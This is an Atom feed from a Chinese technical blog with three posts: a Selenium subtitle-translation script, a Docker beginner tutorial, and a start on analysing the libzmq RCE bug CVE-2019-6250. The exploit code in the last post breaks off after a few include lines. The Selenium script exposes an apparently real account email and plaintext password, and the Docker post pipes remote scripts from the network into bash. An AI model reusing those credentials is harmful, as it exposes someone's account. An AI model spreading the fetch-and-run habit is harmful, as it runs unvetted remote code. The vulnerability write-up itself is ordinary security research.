<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hskull</title>
  <icon>https://www.gravatar.com/avatar/dcfe9e98886e074ee9a9078990a7afb4</icon>
  <subtitle>hskull</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-10-10T17:37:45.155Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>hskull</name>
    <email>hskull00@outlook.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python+selenium模拟点击实现自动化</title>
    <link href="http://example.com/2022/10/10/%E5%BC%80%E5%8F%91/%E6%9D%82%E9%A1%B9/python+selenium%20%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <id>http://example.com/2022/10/10/%E5%BC%80%E5%8F%91/%E6%9D%82%E9%A1%B9/python+selenium%20%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96/</id>
    <published>2022-10-09T16:00:00.000Z</published>
    <updated>2022-10-10T17:37:45.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><p>人生苦短，作为一个黑客，重复工作自动化是一个非常必要的选择。</p><p>这里笔者由于英文水平不过关，还想看国外的课，所以需要来个中文字幕，国内好用的是<a href="https://jianwai.youdao.com/">网易见外</a>，他可以网页操作，翻译质量还是可以的。</p><p>但由于课太多，每一节课的上传、翻译、导出都人工就太浪费生命了，所以我选择selenium来完成模拟点击操作，具体如下：</p><h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><ol><li>首先需要安装下selenium库，selenium已经出到4.x版本了，但python 3.x好像还是不能兼容，所以我选择了比较稳的selenium-3.14.0   安装直接 <code>pip install selenium=3.14.0 即可</code></li><li>接下来需要安装浏览器驱动，可选的有chrome和Firefox，下载完成后解压放在一个目录，记住路径，比如E:\WebDriver<ol><li>Chrome驱动文件下载：<a href="https://chromedriver.storage.googleapis.com/index.html?path=2.35/">点击下载chromedrive</a></li><li>Firefox驱动文件下载:<a href="https://github.com/mozilla/geckodriver/releases">点解下载geckodriver</a></li></ol></li><li>最后配置刚下载的Webdriver驱动的环境变量，我的电脑–&gt;属性–&gt;系统设置–&gt;高级–&gt;环境变量–&gt;系统变量–&gt;Path下添加对应环境变量：E:\WebDriver</li></ol><h1 id="2-代码编写"><a href="#2-代码编写" class="headerlink" title="2. 代码编写"></a>2. 代码编写</h1><p>直接把代码开源了，具体selenium使用非常简单，网上随便搜搜就会用了，花时间的地方在找对应元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">#自动翻译本地英文字幕</span><br><span class="line">from argparse import Action</span><br><span class="line">from ast import Load</span><br><span class="line">from cgi import print_arguments</span><br><span class="line">from csv import excel_tab</span><br><span class="line">from distutils.log import Log</span><br><span class="line">from glob import glob</span><br><span class="line">from importlib.metadata import files</span><br><span class="line">import logging</span><br><span class="line">from threading import local</span><br><span class="line">import time,os</span><br><span class="line">from xml.etree.ElementTree import Element</span><br><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">#网址</span><br><span class="line">login&#x3D;&quot;https:&#x2F;&#x2F;jianwai.youdao.com&#x2F;&quot;                #官网</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user&#x3D;&quot;hskull_888@163.com&quot;</span><br><span class="line">psd&#x3D;&quot;Wy1630227340.0&quot;</span><br><span class="line"></span><br><span class="line">filesPathList&#x3D;[]</span><br><span class="line">dir&#x3D;&quot;E:\AutoTranslate\srcSrt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打开chrome  设置好下载参数</span><br><span class="line">options&#x3D;webdriver.ChromeOptions()</span><br><span class="line">prefs &#x3D; &#123;&#39;profile.default_content_settings.popups&#39;: 0, &#39;download.default_directory&#39;: dir&#125; </span><br><span class="line">options.add_experimental_option(&#39;prefs&#39;, prefs)</span><br><span class="line">driver&#x3D;webdriver.Chrome(chrome_options&#x3D;options)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def OptionRobust(opt,g&#x3D;None,l&#x3D;None):</span><br><span class="line">    global driver</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            print(opt)</span><br><span class="line">            tmp &#x3D; eval(opt,g,l)</span><br><span class="line">            return tmp</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            continue</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">#login</span><br><span class="line">def Login():</span><br><span class="line">    global driver</span><br><span class="line">    #打开官网</span><br><span class="line">    driver.get(login)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    #切换到iframe，不然找不到元素</span><br><span class="line">    iframe &#x3D; driver.find_element_by_xpath(&#39;&#x2F;&#x2F;div[@id&#x3D;&quot;urs-login-block&quot;]&#x2F;iframe&#39;)</span><br><span class="line">    driver.switch_to_frame(iframe)</span><br><span class="line">    #输入账号</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_name(&quot;email&quot;).clear()&#39;)</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_name(&quot;email&quot;).send_keys(user)&#39;)</span><br><span class="line">    #输入密码</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_name(&quot;password&quot;).clear()&#39;)</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_name(&quot;password&quot;).send_keys(psd)&#39;)</span><br><span class="line">    #登录</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_id(&quot;dologin&quot;).click()&#39;)</span><br><span class="line"></span><br><span class="line">#提交</span><br><span class="line">def PushSrcSrt(filePath):</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_class_name(&quot;btn-add&quot;).click()&#39;)</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_class_name(&quot;desc-2&quot;).click()&#39;)</span><br><span class="line">    #开始上传</span><br><span class="line">    print(filePath)</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_class_name(&quot;f-dn&quot;).send_keys(filePath)&#39;,l&#x3D;&#123;&#39;filePath&#39;:filePath&#125;)</span><br><span class="line">    OptionRobust(&#39;driver.find_element_by_class_name(&quot;btn-submit&quot;).click()&#39;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#导出</span><br><span class="line">def DownloadDstSrt():</span><br><span class="line">    global driver,filesPathList</span><br><span class="line">    #获取个数</span><br><span class="line">    titles&#x3D;OptionRobust(&#39;driver.find_elements_by_class_name(&quot;title&quot;)&#39;)</span><br><span class="line">    for i in range(len(titles)):</span><br><span class="line">        title&#x3D;OptionRobust(&#39;driver.find_elements_by_class_name(&quot;title&quot;)[0]&#39;)</span><br><span class="line">        title.click()</span><br><span class="line">        OptionRobust(&#39;driver.find_element_by_class_name(&quot;btn-download&quot;).click()&#39;)</span><br><span class="line">        OptionRobust(&#39;driver.find_element_by_class_name(&quot;confirm&quot;).click()&#39;)</span><br><span class="line">        OptionRobust(&#39;driver.find_element_by_class_name(&quot;icon-back&quot;).click()&#39;)</span><br><span class="line"></span><br><span class="line">#删除上传的</span><br><span class="line">def DeleteSrt():</span><br><span class="line">    global driver,filesPathList</span><br><span class="line">    #获取个数</span><br><span class="line">    titles&#x3D;OptionRobust(&#39;driver.find_elements_by_class_name(&quot;title&quot;)&#39;)</span><br><span class="line">    for i in range(len(titles)):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                action&#x3D;webdriver.ActionChains(driver)</span><br><span class="line">                action.move_to_element(driver.find_elements_by_class_name(&quot;ft&quot;)[0]).perform()</span><br><span class="line">                driver.find_elements_by_class_name(&quot;icon-remove&quot;)[0].click()</span><br><span class="line">                break</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(e)</span><br><span class="line">                continue</span><br><span class="line">        str&#x3D;&#39;driver.find_element_by_xpath(&#39;+&#39;\&#39;&#x2F;&#x2F;*[@id&#x3D;\&quot;boxBody\&quot;]&#x2F;div[2]&#x2F;div&#x2F;div[1]\&#39;&#39;+&#39;).click()&#39;</span><br><span class="line">        OptionRobust(str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#加载本地srt</span><br><span class="line">def LoadStrFiles():</span><br><span class="line">    global filesPathList,dir</span><br><span class="line">    for root, ds, fs in os.walk(dir):</span><br><span class="line">        for f in fs:</span><br><span class="line">            fullname &#x3D; os.path.join(root, f)</span><br><span class="line">            filesPathList.append(fullname)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    LoadStrFiles()</span><br><span class="line">    print(filesPathList)</span><br><span class="line">    Login()</span><br><span class="line">    for f in filesPathList:</span><br><span class="line">        PushSrcSrt(f)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    DownloadDstSrt()</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    DeleteSrt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0. 前言&quot;&gt;&lt;/a&gt;0. 前言&lt;/h1&gt;&lt;p&gt;人生苦短，作为一个黑客，重复工作自动化是一个非常必要的选择。&lt;/p&gt;
&lt;p&gt;这里笔者由于英文水平不过关，还想看国外的课，</summary>
      
    
    
    
    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="selenium" scheme="http://example.com/tags/selenium/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Docker入门</title>
    <link href="http://example.com/2022/07/21/%E6%95%99%E7%A8%8B/Docker%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2022/07/21/%E6%95%99%E7%A8%8B/Docker%E5%85%A5%E9%97%A8/</id>
    <published>2022-07-20T16:00:00.000Z</published>
    <updated>2022-07-23T15:00:53.161Z</updated>
    
    <content type="html"><![CDATA[<p>Docker从发布到现在，可以说是开发者必学的一个软件了，提供了高效的的环境配置迁移方案，可以说非常好用了。</p><p>作为一个安全从业者，平常的逆向工作也是需要各种各样的配置环境的，基于此我也凑个热闹学习一把Docker，省得在折腾环境中浪费生命。</p><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220721110800.png"></p><h1 id="1-虚拟机和linux容器"><a href="#1-虚拟机和linux容器" class="headerlink" title="1. 虚拟机和linux容器"></a>1. 虚拟机和linux容器</h1><p>虚拟机这玩意就不多说了，平常用虚拟机的时间比用主机上系统的时间还长。它缺点还是显而易见的：启动慢，占用资源多；除了提供基础的操作系统环境外，其它各种依赖还是得重新整；迁移起来成本也高。</p><p>而linux容器(LXC)就是linux发展出来的另一种虚拟化技术，它是通过对<strong>进程进行隔离</strong>或者说是在进程外面套了一个保护壳来实现虚拟化的。对于这层保护壳（容器）里面得进程来说，它接触到的各种资源都是虚拟的，进而实现了进程级别的系统隔离。这样的架构使得它：启动快，占资源少，多个容器可共享资源；体积小只需包含必要的组件即可。</p><p>总之，容器就有点像轻量化的虚拟机，能够提供虚拟化的环境，但成本开销小得多。</p><h1 id="2-Docker知识"><a href="#2-Docker知识" class="headerlink" title="2. Docker知识"></a>2. Docker知识</h1><p>终于说到Docker了，Docker是啥呐，说白了就是一款封装好的linux容器，提供了易用的容器使用接口。也就是把应用程序和该程序的依赖都打包起来，作为一个整体文件，运行该文件就会创建一个虚拟容器，容器内的环境和打包时一摸一样。</p><p>Docker是Go写的并遵从Apache2.0协议开源，其架构包括三个基本概念(官方解释)：</p><ul><li>镜像(image)：docker镜像就相当于是一个root文件系统，比如官方镜像ubuntu:16.04就包含了完整的一套Ubuntu16.04最小系统的root文件系统。</li><li>容器(container)：镜像和容器的关系，就像是面对对象程序设计中的类和实例一样，镜像是静态的定义，容器时镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li><li>仓库(repository)：仓库可以看作是一个代码控制中心，用来保存镜像。</li></ul><p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器，可以用如下的图来描述：</p><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220721191601.png"></p><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>Docker 镜像(Images)</td><td>Docker 镜像是用于创建 Docker 容器的模板，比如 Ubuntu 系统。</td></tr><tr><td>Docker 容器(Container)</td><td>容器是独立运行的一个或一组应用，是镜像运行时的实体。</td></tr><tr><td>Docker 客户端(Client)</td><td>Docker 客户端通过命令行或者其他工具使用 Docker SDK (<a href="https://docs.docker.com/develop/sdk/">https://docs.docker.com/develop/sdk/</a>) 与 Docker 的守护进程通信。</td></tr><tr><td>Docker 主机(Host)</td><td>一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。</td></tr><tr><td>Docker Registry</td><td>Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;</strong> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <strong>latest</strong> 作为默认标签。</td></tr><tr><td>Docker Machine</td><td>Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。</td></tr></tbody></table><h1 id="3-Docker安装"><a href="#3-Docker安装" class="headerlink" title="3. Docker安装"></a>3. Docker安装</h1><p>对社区版(Conmmunity Edition,CE)的docker进行安装，各操作系统下的安装方法参考<a href="https://docs.docker.com/engine/install/">官方安装文档</a>：</p><p>链接示例：<a href="https://docs.docker.com/docker-for-mac/install/">Mac</a>、<a href="https://docs.docker.com/docker-for-windows/install/">Windows</a>、<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Ubuntu</a>、<a href="https://docs.docker.com/install/linux/docker-ce/centos/">CentOs</a></p><h2 id="Ubuntu-Docker安装"><a href="#Ubuntu-Docker安装" class="headerlink" title="Ubuntu Docker安装"></a>Ubuntu Docker安装</h2><p>安装方法有挺多的，图省事我这里直接使用脚本进行安装了，有如下的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.官方脚本</span></span><br><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"><span class="comment">#2. 使用国内daocloud一键安装命令</span></span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><p>安装完毕利用 <code>docker version</code>验证确实安装成功:</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/docker/20220721233926.png" alt="img"></p><p>稍微使用几次Docker就会发现，Docker需要用户具有sudo权限，没加sudo就会出现上面这种报错，但为了不每次写sudo以及为了避免给Docker那么大的权限(毕竟咱们是要玩病毒、漏洞的，慎重为好)，可以用 <code>usermode</code>命令把用户加入到Docker用户组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermode -a -G docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><p>加完后记得重启下系统，然后就可以不加 <code>sudo</code>使用了：</p><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220722145401.png"></p><p>接下来还得换个仓库源，Docker提供了官方仓库，里面有很多现成的image文件，但国内使用起来确实慢，需要配置下镜像加速器地址，我这里用了<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">阿里云镜像加速器</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行如下操作，让daemon.json写入配置内容，重启docker</span></span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://9078vr8d.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="4-Docker-hello-world"><a href="#4-Docker-hello-world" class="headerlink" title="4. Docker hello-world"></a>4. Docker hello-world</h1><p>万物皆可hello world，既然都配置好了Docker环境，怎么也得来个hello world进行下庆祝。Docker仓库里是有这个image的，直接pull就好：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Docker下载到的镜像会放在/var/lib/docker/image/下</span></span><br><span class="line">docker image pull hello-world</span><br><span class="line"><span class="comment">#查看镜像下载成功没</span></span><br><span class="line">dcoker image ls</span><br><span class="line"><span class="comment">#启动对应容器</span></span><br><span class="line">docker container run hello-world</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220722115950.png"></p><p>上面就是hello-world构造的容器正确运行后输出的结果，其创建的容器会自动结束比较简单。上面也提示了可以运行Ubuntu的image，这个一听就是比较厉害了，试试能不能让我Ubuntu套Ubuntu：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu bash</span><br><span class="line"><span class="comment">#ps: -i：交互式操作  -t：终端 bash：命令，提供一个交互式的shell</span></span><br></pre></td></tr></table></figure><p>挺不错昂，这就好玩起来了：</p><p>![image-20220722121041088](C:\Users\haoshaoqing\Documents\My Knowledge\temp\857177265\0. docker入门.md-857177265.assets\image-20220722121041088.png)</p><p>既然通过镜像创建了容器，那么怎么查看我有哪些容器以及它们的状态呐，那就是用下面的命令了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#列举所有容器</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220722121356.png"></p><p>至于其它关于容器、镜像的命令，都可以通过help来查看详细说明，用到就会了，这里不列举了。</p><h1 id="5-Docker仓库管理"><a href="#5-Docker仓库管理" class="headerlink" title="5. Docker仓库管理"></a>5. Docker仓库管理</h1><p>配置好环境的镜像理论上可以存在任意位置，但为了方便随时取用，放在网上是一个好的选择，可以选择放github、Docker hub等地方。</p><p><a href="https://hub.docker.com/">Docker hub</a>是Docker官方维护的一个公共仓库，可以提供给个人、团队使用，个人使用免费，注册一个账号就可以用了:</p><p><img src="https://cdn.jsdelivr.net/gh//hskull00/images/Docker/20220722152731.png"></p><p>使用的时候通过 <code>docker login</code>登录，登陆后可以拉取到自己的全部镜像，也可以通过 <code>docker push</code>推送自己的镜像到Docker hub，使用完毕后退出 <code>docker logout</code>。</p><h1 id="6-Dockerfile"><a href="#6-Dockerfile" class="headerlink" title="6. Dockerfile"></a>6. Dockerfile</h1><p>如上，docker基础的安装和使用大致就这些内容，后面我会通过Docker安装Node.js来把博客的本地环境进行下迁移。</p><p>参考:</p><p><a href="https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p><p><a href="https://www.runoob.com/docker/docker-architecture.html">https://www.runoob.com/docker/docker-architecture.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Docker从发布到现在，可以说是开发者必学的一个软件了，提供了高效的的环境配置迁移方案，可以说非常好用了。&lt;/p&gt;
&lt;p&gt;作为一个安全从业者，平常的逆向工作也是需要各种各样的配置环境的，基于此我也凑个热闹学习一把Docker，省得在折腾环境中浪费生命。&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="教程" scheme="http://example.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="教程" scheme="http://example.com/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>libzmq远程代码执行漏洞(CVE-2019-6250)分析</title>
    <link href="http://example.com/2021/10/14/%E6%BC%8F%E6%B4%9E/libzmq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2019-6250)/"/>
    <id>http://example.com/2021/10/14/%E6%BC%8F%E6%B4%9E/libzmq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2019-6250)/</id>
    <published>2021-10-13T16:00:00.000Z</published>
    <updated>2021-12-19T12:43:35.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>ZMQ(Zero Message Queue)是一种基于消息队列得多线程网络库，C++编写，可以使得Socket编程更加简单高效。</p><p>该编号为CVE-2019-6250的远程执行漏洞，主要出现在ZMQ的核心引擎libzmq(4.2.x以及4.3.1之后的4.3.x)定义的ZMTP v2.0协议中。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>先搭建个测试poc和后面调试漏洞的环境，这里用到了：</p><ul><li>Ubuntu 20.4.2</li><li>libzmq  4.2.x以及4.3.1之后的4.3.x这几个版本都可以触发漏洞，下载后切换版本安装即可测试 <a href="https://github.com/zeromq/libzmq">项目地址</a></li><li>cppzmq   用来调用libzmq执行代码，测试poc  <a href="https://github.com/zeromq/cppzmq">项目地址</a></li><li>poc地址<a href="https://github.com/zeromq/libzmq/issues/3351">在这</a></li></ul><h2 id="poc测试"><a href="#poc测试" class="headerlink" title="poc测试"></a>poc测试</h2><p>将libzmp和cppzmq都安装好，其中libzmp是configure来安装的，cppzmq是cmake来安装的，安装过程简单。</p><p>都安装完后，cppzmq下有个demo目录，下面也 <code>cmake ./</code>编译，完成后即可在demo这里堆main.cpp修改来进行漏洞测试，main.cpp代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq.hpp&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    zmq::<span class="keyword">context_t</span> contex;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是引入了zmq.hpp头文件，这个决定了poc是否能测试成功，输出个hello world测试一下，成功说明环境配置都ok了：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/linux%E6%BC%8F%E6%B4%9E/cve-1019-625020211103192634.png"></p><p>去拿到poc，为了省事，我这里也贴一份现成的exp出来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;zmq.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span 